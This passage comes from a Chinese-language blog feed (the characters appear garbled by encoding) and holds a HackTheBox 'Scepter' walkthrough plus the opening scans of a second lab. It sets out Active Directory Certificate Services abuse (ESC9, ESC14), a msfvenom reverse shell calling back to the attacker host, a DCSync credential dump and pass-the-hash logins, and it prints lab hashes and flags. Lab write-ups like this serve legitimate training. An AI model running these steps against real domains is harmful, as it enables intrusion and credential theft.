nfs_backup nxc smb 10.10.11.65 -u a.carter -p 123456       \nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\a.carter:123456 \n```\n\n## To H.brown\n\né€šè¿‡ BloodHound æŸ¥çœ‹ä¸€ä¸‹ a.carter çš„æƒé™ã€‚å¯¹ `STAFF ACCESS CERTIFICATE` æœ‰ GenericAll æƒé™\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image2.png)\n\nèµ‹äºˆ a.carter å¯¹`STAFF ACCESS CERTIFICATE`  `Fullcontrol` æƒé™\n\n```bash\nâœ  nfs_backup dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'123456'\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20250425-071815.bak\n[*] DACL modified successfully!\n```\n\n```bash\nâœ  Scepter bloodhound-python -u 'a.carter' -p '123456' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nINFO: Done in 00M 31S\nINFO: Compressing output into 20250425071924_bloodhound.zip\n```\n\nç²—ç•¥ä¸€çœ‹æ²¡æ‰¾åˆ°é“¾å­ï¼Œå…ˆæ‰¾æ‰¾ä¸‹ä¸€ä¸ªç›®æ ‡è´¦æˆ·ï¼ŒæŸ¥çœ‹äº†ç”¨æˆ·åå‘ç° `h.brown` æ˜¯è¿œç¨‹ç®¡ç†ç»„æˆå‘˜ï¼Œæš‚ä¸”å°†å…¶ä½œä¸ºç›®æ ‡ç”¨æˆ·ã€‚\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image3.png)\n\n### ESC9\n\nä¸€å¼€å§‹ç»™æˆ‘ä»¬æä¾›çš„å°±æ˜¯è¯ä¹¦æ¥è·å¾—ç”¨æˆ·ï¼Œæ‰€ä»¥çŸ¥è¯†ç‚¹å¯èƒ½åœ¨ AD CS\n\nä½¿ç”¨ certipy æ”¶é›†æ•°æ®\n\n```bash\nâœ  Scepter certipy-ad find -u a.carter@scepter.htb -p 123456 -dc-ip 10.10.11.65 -bloodhound                                                                                     \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 35 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 13 enabled certificate templates\n[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP\n[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via RRP: The NETBIOS connection with the remote host timed out.\n[!] Failed to get CA configuration for 'scepter-DC01-CA'\n[*] Saved BloodHound data to '20250425111914_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n```\n\nESC4 ä¹Ÿæœ‰ï¼Œä½†æ˜¯æˆ‘ä»¬å½“å‰çš„ç”¨æˆ·æ— æ³•å®ç°ã€‚æœ€åå‘ç° `ESC9` è²Œä¼¼æ˜¯æˆ‘ä»¬å½“å‰å¯ä»¥åˆ©ç”¨çš„\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image4.png)\n\nåˆ©ç”¨é“¾æ¥ï¼šhttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension\n\nè¯¥ç»„ç»‡å±æ€§ï¼š\n\n| å±æ€§ | å€¼ |\n| --- | --- |\n| Any Purpose | False |\n| Authorized Signatures Required | 0 |\n| Certificate Authorities | scepter-DC01-CA |\n| Certificate Name Flag | SubjectRequireEmail<br>SubjectRequireDnsAsCn<br>SubjectAltRequireEmail |\n| Client Authentication | True |\n| Display Name | StaffAccessCertificate |\n| Enabled | True |\n| Enrollee Supplies Subject | False |\n| Enrollment Agent | False |\n| Enrollment Flag | NoSecurityExtension<br>AutoEnrollment |\n| Extended Key Usage | Client Authentication<br>Server Authentication |\n| Minimum RSA Key Length | 2,048 |\n| Private Key Flag | 16842752 |\n| Renewal Period | 6 weeks |\n| Requires Key Archival | False |\n| Requires Manager Approval | False |\n| Template Name | StaffAccessCertificate |\n| Validity Period | 99 years |\n| Domain | SCEPTER.HTB |\n| Type | Certificate Template |\n\næ¥è‡ªä¸Šé¢çš„é“¾æ¥ï¼šåœ¨æ­¤æ–¹æ¡ˆä¸­ï¼Œuser1 å¯¹ user2 å…·æœ‰Â `GenericWrite`ï¼Œå¹¶å¸Œæœ›å…¥ä¾µ user3ã€‚å…è®¸ user2 æ³¨å†Œä¸€ä¸ªæ˜“å—æ”»å‡»çš„æ¨¡æ¿ï¼Œè¯¥æ¨¡æ¿åœ¨Â `msPKI-Enrollment-Flag`Â å€¼ä¸­æŒ‡å®šÂ `CT_FLAG_NO_SECURITY_EXTENSION`Â æ ‡å¿—ã€‚\n\n```bash\ncertipy-ad shadow auto -username \"a.carter@scepter.htb\" -p \"123456\" -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn h.brown -dc-ip 10.10.11.65\ncertipy-ad req -username \"d.baker@scepter.htb\" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn \"d.baker@scepter\" -dc-ip 10.10.11.65\ncertipy-ad auth -pfx 'h.brown.pfx' -domain \"scepter.htb\" -dc-ip 10.10.11.65\n```\n\næ‰§è¡Œåˆ°ç¬¬ä¸‰æ¡çš„æ—¶å€™å‡ºç°äº†å¦‚ä¸‹é”™è¯¯\n\n```bash\nâœ  ADCS certipy-ad req -username \"d.baker@scepter.htb\" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.\n[*] Request ID is 38\nWould you like to save the private key? (y/N) Y\n[*] Saved private key to 38.key\n[-] Failed to request certificate\n```\n\nè¡¨æ˜åœ¨è¯ä¹¦ç”³è¯·è¿‡ç¨‹ä¸­ï¼Œ**è¯ä¹¦é¢å‘è¯·æ±‚**ä¸­éœ€è¦åŒ…å« **email** ä¿¡æ¯ï¼Œä½†åœ¨ä½ çš„è¯·æ±‚ä¸­ï¼Œ**email ä¿¡æ¯ç¼ºå¤±æˆ–æ— æ³•è·å–**ã€‚å…·ä½“æ¥è¯´ï¼Œé”™è¯¯ `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` æŒ‡æ˜ï¼Œè¯ä¹¦æ¨¡æ¿è¦æ±‚åœ¨ **Subject** æˆ– **Subject Alternative Name (SAN)** ä¸­å¿…é¡»åŒ…å«æœ‰æ•ˆçš„ email åœ°å€ã€‚\n\nè¯¢é—®**ä½¬**ä»¬åå¾—çŸ¥å¯ä»¥é€šè¿‡ `BloodyAD` æ¥ä¿®æ”¹ï¼Œå°† d.baker çš„\n\n```bash\nbloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb\n```\n\né‚£ä¹ˆå‘½ä»¤å°±å˜ä¸º\n\n```bash\ncertipy-ad shadow auto -username \"a.carter@scepter.htb\" -p \"123456\" -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn h.brown -dc-ip 10.10.11.65\nbloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb\ncertipy-ad req -username \"d.baker@scepter.htb\" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn \"d.baker@scepter\" -dc-ip 10.10.11.65\ncertipy-ad auth -pfx 'd.baker.pfx' -domain \"scepter.htb\" -dc-ip 10.10.11.65 -username h.brown\n```\n\næœ€åè·å¾— `h.brown`  çš„ TGT\n\n```bash\nâœ  Scepter certipy-ad auth -pfx 'd.baker.pfx' -domain \"scepter.htb\" -dc-ip 10.10.11.65 -username h.brown\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Could not find identification in the provided certificate\n[*] Using principal: h.brown@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'h.brown.ccache'\n[*] Trying to retrieve NT hash for 'h.brown'\n[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c\n```\n\nå¯¼å…¥ TGT\n\n```bash\nâœ  Scepter export KRB5CCNAME=h.brown.ccache \n```\n\nç¼–å†™ `/etc/krb5.conf`\n\n```bash\nâœ  Scepter cat /etc/krb5.conf                                                      \n[libdefaults]\n    default_realm = scepter.HTB\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n\n[realms]\n    SCEPTER.HTB = {\n        kdc = dc01.scepter.htb\n        admin_server = dc01.haze.htb\n    }\n\n[domain_realm]\n    .scepter.htb = scepter.HTB\n    scepter.htb = scepter.HTB\n```\n\nä½¿ç”¨`evil-winrm`ç™»å½•\n\n```bash\nâœ  Scepter ntpdate -s 10.10.11.65 ; evil-winrm -r scepter.htb -i dc01.scepter.htb -u h.brown\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: User is not needed for Kerberos auth. Ticket will be used\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> \n```\n\nç»ˆäºç™»å½•è¿›æ¥äº†ï¼Œäº‹ä¸å®œè¿Ÿå…ˆè¯» user.txt\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Desktop> type user.txt\n4e1f18052814cfb9f26a1497a8bc1cc6\n```\n\næ”¶é›†ä¸€æ³¢æ•°æ®\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                        Attributes\n=========================================== ================ ========================================== ==================================================\nEveryone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group\nSCEPTER\\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group\n```\n\n## To P.adams\n\n### ESC14 - **å¯¹ altSecurityIdentities çš„å†™å…¥è®¿é—®æƒé™**\n\nç°åœ¨ç›®æ ‡ç”¨æˆ·æ˜¯ `P.adams`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image5.png)\n\næšä¸¾ç”¨æˆ· `h.brown`  æ˜¯å¦æœ‰ä¿®æ”¹æŸäº›å¯¹è±¡ï¼ˆå¦‚ç»„æˆå‘˜å…³ç³»ã€ACL æˆ–æƒé™ï¼‰çš„èƒ½åŠ›ã€‚\n\n```bash\nâœ  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --de\n...\ndistinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb\naltSecurityIdentities: WRITE\n```\n\nå¯¹ `p.adams` çš„ `altSecurityIdentities` å¯å†™\n\nå¤§æ¦‚æ˜¯å¯ä»¥åˆ©ç”¨ï¼šhttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities | https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\n\næ”»å‡»è€…å¯¹ç›®æ ‡çš„Â `altSecurityIdentities`Â å±æ€§å…·æœ‰å†™å…¥æƒé™ã€‚ä»–å¯ä»¥å°†è¯ä¹¦æ³¨å†Œä¸ºå—å®³è€…ï¼Œå¹¶é€šè¿‡ä¿®æ”¹å…¶Â `altSecurityIdentities`Â å±æ€§å¹¶å°†å…¶æŒ‡å‘è·å–çš„è¯ä¹¦æ¥ä¸ºç›®æ ‡åˆ›å»ºæ˜¾å¼æ˜ å°„ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨è¯¥è¯ä¹¦ä½œä¸ºç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚\n\næ”»å‡»æ ¹æ®ï¼šhttps://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9 çš„ `ESC14`åœºæ™¯`A` \n\nå…ˆä½¿ç”¨ h.brown æ¥è¿›è¡Œä¸Šçº¿ MSFï¼Œåç»­ä¸€äº›æ“ä½œåœ¨`evil-winrm`ä¸­æ“ä½œä¼šæœ‰`bug`\n\n```bash\nâœ  Scepter msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.59 lport=1234 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n```\n\n```bash\nâœ  Scepter msfconsole \nMetasploit tip: View all productivity tips with the tips command\n\n_                                                    _\n/ \\    /\\         __                         _   __  /_/ __\n| |\\  / | _____   \\ \\           ___   _____ | | /  \\ _   \\ \\\n| | \\/| | | ___\\ |- -|   /\\    / __\\ | -__/ | || | || | |- -|\n|_|   | | | _|__  | |_  / -\\ __\\ \\   | |    | | \\__/| |  | |_\n|/  |____/  \\___\\/ /\\ \\\\___/   \\/     \\__|    |_\\  \\___\\\n\n=[ metasploit v6.4.34-dev                          ]\n+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]\n+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\n[*] Starting persistent handler(s)...\nmsf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lport 1234\nlport => 1234\nmsf6 exploit(multi/handler) > set lhost 10.10.16.59\nlhost => 10.10.16.59\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> upload shell.exe\n                                        \nInfo: Uploading /root/Desktop/test/Scepter/shell.exe to C:\\Users\\h.brown\\Documents\\shell.exe\n                                        \nData: 98400 bytes of 98400 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> ./shell.exe\n```\n\n```bash\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n[*] Sending stage (177734 bytes) to 10.10.11.65\n[*] Meterpreter session 1 opened (10.10.16.59:1234 -> 10.10.11.65:60515) at 2025-04-26 06:25:04 -0400\n\nmeterpreter > \n```\n\nåˆ›å»ºè®¡ç®—æœºè´¦æˆ· `ciallo`\n\n```bash\nâœ  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 123456 add computer ciallo 123456\n[+] ciallo created\n```\n\né€šè¿‡ `certipy` è¯·æ±‚è¯ä¹¦\n\n```bash\nâœ  Scepter certipy-ad req -username \"ciallo$\" -p 123456 -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'Machine' -dc-ip 10.10.11.65 -debug\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Trying to resolve 'dc01.scepter.htb' at '10.10.11.65'\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 23\n[*] Got certificate with DNS Host Name 'ciallo.scepter.htb'\n[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9104'\n[*] Saved certificate and private key to 'ciallo.pfx'\n```\n\nå°†è¯ä¹¦è½¬æ¢ä¸º`crt`å¹¶æŸ¥çœ‹ä¿¡æ¯\n\n```bash\nâœ  Scepter certipy-ad cert -pfx ciallo.pfx -nokey -out ciallo.crt\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Writing certificate and  to 'ciallo.crt'\n```\n\n```bash\nâœ  Scepter openssl x509 -in ciallo.crt -noout -serial -issuer\nserial=620000001B02CCD1DA2D79435E00000000001B\nissuer=DC=htb, DC=scepter, CN=scepter-DC01-CA\n```\n\næˆ‘ä»¬ä½¿ç”¨è¯ä¹¦ä¸­çš„åºåˆ—å·å’Œé¢å‘è€…Â `distinguishedName`Â æ¥è·å– `X509IssuerSerialNumber` æ˜ å°„æ ¼å¼\n\nä½¿ç”¨ GPT æ¥æ ¹æ®è„šæœ¬ï¼šhttps://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1 æ”¹ç¼–ä¸º Python è„šæœ¬ï¼Œå¹¶è¿è¡Œã€‚\n\n```bash\nimport argparse\n\ndef convert(serial, issuer):\n    serial = serial.replace(':', '').lower()\n    serial_bytes = bytearray.fromhex(serial)\n    serial_bytes.reverse()\n    serial_hex = ''.join(['%02x' % b for b in serial_bytes])\n    \n    # æ‹†åˆ† issuerï¼Œå¹¶åè½¬é¡ºåº\n    issuer_parts = issuer.split(',')\n    issuer_parts = [p.strip() for p in issuer_parts]\n    issuer_parts.reverse()  # åè½¬é¡ºåºï¼Œè¿™é‡Œä¸æ”¹\n    issuer_str = ','.join(issuer_parts)\n    \n    # è°ƒæ•´è¾“å‡ºé¡ºåºï¼šç¡®ä¿ \"DC=scepter,DC=htb\" åœ¨ \"CN=scepter-DC01-CA\" ä¹‹å‰\n    issuer_str = issuer_str.replace(\"CN=\", \"\").replace(\"DC=\", \"CN=\").replace(\",\", \",DC=\").strip()\n    \n    print(f\"X509:<I>{issuer_str}<SR>{serial_hex}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-serial', required=True, help='Certificate serial (colon separated)')\n    parser.add_argument('-issuer', required=True, help='Certificate issuer')\n    args = parser.parse_args()\n    \n    convert(args.serial, args.issuer)\n```\n\n```bash\nâœ  Scepter python Get-X509IssuerSerialNumberFormat.py\nX509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>B10000000000E53497D2AD1DCC20B100000026\n```\n\né€šè¿‡ PowerShell æ›´æ”¹ç”¨æˆ· h.brown çš„ `altSecurityIdentities` å±æ€§ï¼ˆGPTï¼‰\n\n```bash\n$map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>2800000000008dde9c88b25b6ad22800000062'\nSet-ADUser p.adams -Replace @{altSecurityIdentities=$map}\n```\n\n```bash\nmeterpreter > shell\nProcess 4920 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.7131]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\h.brown\\Documents>powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\h.brown\\Documents> $map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'\n$map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'\nPS C:\\Users\\h.brown\\Documents> Set-ADUser -Identity \"p.adams\" -Replace @{altSecurityIdentities=$map}\nSet-ADUser -Identity \"p.adams\" -Replace @{altSecurityIdentities=$map}\n```\n\næŸ¥çœ‹æ›´æ”¹åçš„å±æ€§å€¼\n\n```bash\nGet-ADUser -Identity \"p.adams\" -Properties altSecurityIdentities | Select-Object altSecurityIdentities\n```\n\né€šè¿‡ `certipy` æ ¹æ®è®¡ç®—æœºè´¦æˆ·çš„è¯ä¹¦ `ciallo.pfx` ç”³è¯·ç”¨æˆ· `p.adams` çš„ `TGT`\n\n```bash\nâœ  Scepter certipy-ad auth -pfx ciallo.pfx -dc-ip 10.10.11.65 -username p.adams\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'ciallo$'\nDo you want to continue? (Y/n) y\n[*] Using principal: p.adams@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'p.adams.ccache'\n[*] Trying to retrieve NT hash for 'p.adams'\n[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image6.png)\n\nç›´æ¥ `DCSync`\n\n```bash\nâœ  Scepter secretsdump.py -k -no-pass dc01.scepter.htb -dc-ip 10.10.11.65                                       \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n                                                                                                               \n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::\n...many...\n```\n\n```bash\nâœ  Scepter evil-winrm -i dc01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> \n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> type root.txt\nfcd40eb94aeca1942488f8decb6cc0b7\n```\n\n## æ€»ç»“\n\nåæ­£å°±æ˜¯æ¯æ¬¡æ‰“ADéƒ½æ˜¯ä¸ä¼šçš„ï¼Œé å¤§ä½¬å¸¦è¿‡çš„â€¦\n\nç¬¬ä¸€æ¬¡é‡åˆ° ADCS ç±»çš„æ”»å‡»ï¼Œæ— ä»ä¸‹æ‰‹ï¼Œä»»é‡é“è¿œã€‚\n",
            "url": "https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter",
            "title": "HackTheBox - Machine - Scepter",
            "summary": "Machine Scepterl https://app.hackthebox.com/machines/Scepter | Hard PSï¼šä¸€ç›´ä»¥ä¸º Season è¿‡äº†ä¹‹åå°±ä¸èƒ½ç™½å«–é¶æœºäº†â€¦å¯¼è‡´é”™è¿‡äº†ä¸¤å‘¨çš„é¶æœºâ€¦å‘œå‘œå‘œ å‰æœŸè¸©ç‚¹ Windows é¶æœºçš„ç«¯å£ï¼Œä½†ä¸ä¸€å®šæ˜¯åŸŸæ§ä¸»æœºï¼ˆPS:åé¢æ‰çŸ¥é“æˆ‘æ‰«...",
            "date_modified": "2025-04-26T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "Windowsé¶æœº",
                "HackTheBox",
                "ADCS",
                "ESC"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity",
            "content_html": "\n# Mentallity\n\n> https://labs.thehackerslabs.com/machine/120\n> \n\n![image.png](/post-images/TheHackersLabsMentallity/image.png)\n\n## Recon\n\n### PortScan\n\n`namp` ç«¯å£æ‰«æ\n\n```bash\nâœ  Mentallity nmap -sn 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:45 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00032s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00027s latency).\nMAC Address: 08:00:27:3B:D1:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.28\nHost is up (0.00024s latency).\nMAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.91\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:11:40:07 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 27.97 seconds\n```\n\nè²Œä¼¼æ˜¯åŒç½‘å¡\n\n```bash\nâœ  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.28\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST \nWarning: 192.168.56.28 giving up on port because retransmission cap hit (10). \nNmap scan report for 192.168.56.28              \nHost is up (0.00057s latency).                  \nNot shown: 63744 closed tcp ports (conn-refused), 1762 filtered tcp ports (no-response)\nPORT      STATE SERVICE                         \n21/tcp    open  ftp                             \n53/tcp    open  domain                          \n80/tcp    open  http                            \n88/tcp    open  kerberos-sec                    \n135/tcp   open  msrpc                           \n139/tcp   open  netbios-ssn                     \n389/tcp   open  ldap                            \n445/tcp   open  microsoft-ds                    \n464/tcp   open  kpasswd5                        \n593/tcp   open  http-rpc-epmap                  \n636/tcp   open  ldapssl                         \n3268/tcp  open  globalcatLDAP                   \n3269/tcp  open  globalcatLDAPssl                \n5985/tcp  open  wsman                           \n8080/tcp  open  http-proxy                      \n9389/tcp  open  adws                            \n47001/tcp open  winrm  \n...    \n\nâœ  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.91\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST\nWarning: 192.168.56.91 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.91\nHost is up (0.00024s latency).\nNot shown: 63929 closed tcp ports (conn-refused), 1577 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n8080/tcp  open  http-proxy\n9389/tcp  open  adws\n47001/tcp open  winrm    \n...     \n```\n\n```bash\nâœ  Mentallity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.28\nStarting Nmap 7.95 ( https://nmap.org ) at 